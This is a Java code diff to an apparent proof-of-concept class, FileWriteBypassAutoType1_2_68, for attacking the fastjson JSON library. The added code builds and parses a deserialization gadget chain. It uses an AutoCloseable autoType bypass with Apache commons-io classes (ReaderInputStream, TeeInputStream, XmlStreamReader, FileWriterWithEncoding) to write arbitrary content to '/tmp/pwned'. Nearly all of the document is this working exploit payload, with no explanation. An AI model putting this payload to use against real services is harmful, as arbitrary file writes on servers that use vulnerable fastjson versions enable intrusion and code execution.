@@ -25,7 +25,7 @@ public class FileWriteBypassAutoType1_2_68 {
         + "        'out':\n"
         + "        {\n"
         + "           '@type':'java.io.FileOutputStream',\n"
-        + "           'file':'dst',\n"
+        + "           'file':'/tmp/aaxxx',\n"
         + "           'append':false\n"
         + "        },\n"
         + "        'infl':\n"
@@ -62,7 +62,89 @@ public class FileWriteBypassAutoType1_2_68 {
         + "    },\n"
         + "    'protocolVersion':1\n"
         + "}";
-    JSON.parse(json_for_jdk11);
+
+    String userJson = "\n" +
+            "{\n" +
+            "  \"x\":{\n" +
+            "    \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
+            "    \"input\":{\n" +
+            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
+            "      \"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\n" +
+            "      \"reader\":{\n" +
+            "        \"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\n" +
+            "        \"charSequence\":{\"@type\":\"java.lang.String\"\"testaaaaaaaaaaaaaaaaaaaa\"\n" +
+            "      },\n" +
+            "      \"charsetName\":\"UTF-8\",\n" +
+            "      \"bufferSize\":1024\n" +
+            "    },\n" +
+            "    \"branch\":{\n" +
+            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
+            "      \"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\n" +
+            "      \"writer\":{\n" +
+            "        \"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\n" +
+            "        \"file\":\"/tmp/pwned\",\n" +
+            "        \"charsetName\":\"UTF-8\",\n" +
+            "        \"append\": false\n" +
+            "      },\n" +
+            "      \"charset\":\"UTF-8\",\n" +
+            "      \"bufferSize\": 1024,\n" +
+            "      \"writeImmediately\": true\n" +
+            "    },\n" +
+            "    \"trigger\":{\n" +
+            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
+            "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
+            "      \"is\":{\n" +
+            "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
+            "        \"input\":{\n" +
+            "          \"$ref\":\"$.input\"\n" +
+            "        },\n" +
+            "        \"branch\":{\n" +
+            "          \"$ref\":\"$.branch\"\n" +
+            "        },\n" +
+            "        \"closeBranch\": true\n" +
+            "      },\n" +
+            "      \"httpContentType\":\"text/xml\",\n" +
+            "      \"lenient\":false,\n" +
+            "      \"defaultEncoding\":\"UTF-8\"\n" +
+            "    },\n" +
+            "    \"trigger2\":{\n" +
+            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
+            "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
+            "      \"is\":{\n" +
+            "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
+            "        \"input\":{\n" +
+            "          \"$ref\":\"$.input\"\n" +
+            "        },\n" +
+            "        \"branch\":{\n" +
+            "          \"$ref\":\"$.branch\"\n" +
+            "        },\n" +
+            "        \"closeBranch\": true\n" +
+            "      },\n" +
+            "      \"httpContentType\":\"text/xml\",\n" +
+            "      \"lenient\":false,\n" +
+            "      \"defaultEncoding\":\"UTF-8\"\n" +
+            "    },\n" +
+            "    \"trigger3\":{\n" +
+            "      \"@type\":\"java.lang.AutoCloseable\",\n" +
+            "      \"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\n" +
+            "      \"is\":{\n" +
+            "        \"@type\":\"org.apache.commons.io.input.TeeInputStream\",\n" +
+            "        \"input\":{\n" +
+            "          \"$ref\":\"$.input\"\n" +
+            "        },\n" +
+            "        \"branch\":{\n" +
+            "          \"$ref\":\"$.branch\"\n" +
+            "        },\n" +
+            "        \"closeBranch\": true\n" +
+            "      },\n" +
+            "      \"httpContentType\":\"text/xml\",\n" +
+            "      \"lenient\":false,\n" +
+            "      \"defaultEncoding\":\"UTF-8\"\n" +
+            "    }\n" +
+            "  }\n" +
+            "}";
+
+    JSON.parseObject(userJson);
   }
 
 }
